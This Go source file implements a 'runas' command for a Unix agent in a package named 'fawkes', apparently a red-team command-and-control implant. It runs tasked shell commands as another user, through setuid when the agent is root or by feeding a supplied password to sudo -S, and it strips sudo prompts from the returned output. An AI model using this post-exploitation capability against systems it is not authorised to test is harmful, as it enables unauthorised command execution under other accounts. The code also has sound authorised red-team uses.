//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

// RunasCommand executes a command as a different user on Linux/macOS.
// As root: uses setuid/setgid via SysProcAttr.Credential.
// Not root: falls back to sudo -S -u <user> with password via stdin.
type RunasCommand struct{}

func (c *RunasCommand) Name() string        { return "runas" }
func (c *RunasCommand) Description() string { return "Execute a command as a different user" }

func (c *RunasCommand) Execute(task structs.Task) structs.CommandResult {
	var args runasArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Command == "" || args.Username == "" {
		return structs.CommandResult{
			Output:    "Error: -command and -username are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.NetOnly {
		return structs.CommandResult{
			Output:    "Error: -netonly is Windows-only (LOGON_NETCREDENTIALS_ONLY). Not applicable on Unix.",
			Status:    "error",
			Completed: true,
		}
	}

	// Strip domain prefix if provided (not meaningful on Unix, but handle gracefully)
	username := args.Username
	if parts := strings.SplitN(username, `\`, 2); len(parts) == 2 {
		username = parts[1]
	} else if parts := strings.SplitN(username, "@", 2); len(parts) == 2 {
		username = parts[0]
	}

	// Look up the target user
	targetUser, err := user.Lookup(username)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: user '%s' not found: %v", username, err),
			Status:    "error",
			Completed: true,
		}
	}

	uid, err := strconv.ParseUint(targetUser.Uid, 10, 32)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: invalid UID for user '%s': %v", username, err),
			Status:    "error",
			Completed: true,
		}
	}
	gid, err := strconv.ParseUint(targetUser.Gid, 10, 32)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: invalid GID for user '%s': %v", username, err),
			Status:    "error",
			Completed: true,
		}
	}

	if os.Getuid() == 0 {
		return runasRoot(args.Command, username, uint32(uid), uint32(gid))
	}
	if args.Password != "" {
		return runasSudo(args.Command, username, args.Password)
	}

	return structs.CommandResult{
		Output:    "Error: not running as root and no password provided. Either run agent as root or provide -password for sudo.",
		Status:    "error",
		Completed: true,
	}
}

// runasRoot spawns a process as the target user using setuid/setgid.
// Requires the agent to be running as root (UID 0).
func runasRoot(command, username string, uid, gid uint32) structs.CommandResult {
	cmd := exec.Command("/bin/sh", "-c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Credential: &syscall.Credential{
			Uid: uid,
			Gid: gid,
		},
		Setsid: true,
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		outputStr := strings.TrimSpace(string(output))
		if outputStr != "" {
			return structs.CommandResult{
				Output:    fmt.Sprintf("[runas %s (uid=%d)] %s\nError: %v", username, uid, outputStr, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("[runas %s (uid=%d)] Error: %v", username, uid, err),
			Status:    "error",
			Completed: true,
		}
	}

	outputStr := strings.TrimSpace(string(output))
	if outputStr == "" {
		outputStr = "(no output)"
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("[runas %s (uid=%d, setuid)] %s", username, uid, outputStr),
		Status:    "success",
		Completed: true,
	}
}

// runasSudo executes a command as the target user via sudo -S -u <user>.
// The password is provided via stdin. This does not require root but
// requires sudo to be installed and the current user to have sudo rights.
func runasSudo(command, username, password string) structs.CommandResult {
	cmd := exec.Command("sudo", "-S", "-u", username, "--", "/bin/sh", "-c", command)
	cmd.Stdin = strings.NewReader(password + "\n")

	output, err := cmd.CombinedOutput()
	// sudo echoes password prompt to stderr which gets mixed into output — strip it
	outStr := strings.TrimSpace(string(output))
	outStr = stripSudoPrompt(outStr)

	if err != nil {
		if outStr != "" {
			return structs.CommandResult{
				Output:    fmt.Sprintf("[runas %s (sudo)] %s\nError: %v", username, outStr, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("[runas %s (sudo)] Error: %v", username, err),
			Status:    "error",
			Completed: true,
		}
	}

	if outStr == "" {
		outStr = "(no output)"
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("[runas %s (sudo)] %s", username, outStr),
		Status:    "success",
		Completed: true,
	}
}

// stripSudoPrompt removes common sudo password prompts from output.
func stripSudoPrompt(s string) string {
	lines := strings.Split(s, "\n")
	var filtered []string
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "[sudo] password for ") ||
			trimmed == "Password:" ||
			trimmed == "Sorry, try again." {
			continue
		}
		filtered = append(filtered, line)
	}
	return strings.TrimSpace(strings.Join(filtered, "\n"))
}
